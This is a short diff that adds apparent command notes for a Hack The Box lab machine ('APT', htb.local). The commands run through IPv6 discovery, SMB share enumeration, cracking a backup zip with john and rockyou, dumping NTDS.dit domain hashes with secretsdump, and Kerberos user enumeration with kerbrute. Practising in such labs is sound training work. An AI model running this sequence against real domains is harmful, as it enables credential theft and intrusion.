@@ -1,0 +1,12 @@
+sudo python3 IOXIDResolver.py -t 10.10.10.213
+nmap -6 dead:beef::b885:d62a:d679:573f
+sudo smbclient -L dead:beef::b885:d62a:d679:573f
+smbclient --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=107131072 SO_SNDBUF=107131072' //apt.htb.local/backup
+smbclient -t 50000 //apt/htb.local/backup
+sudo zip2john backup.zip >hash
+john hash --wordlist=/usr/share/wordlist/rockyou.txt
+sudo unzip backup.zip
+sudo python3 secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -output APT
+grep '::::' APT | awk -F: '{print $1}' >users
+grep ::: APT|cut -d: -f 3-4 >hashes
+python kerbrute.py userenum -d htb.local --dc apt.htb.local users -t 50
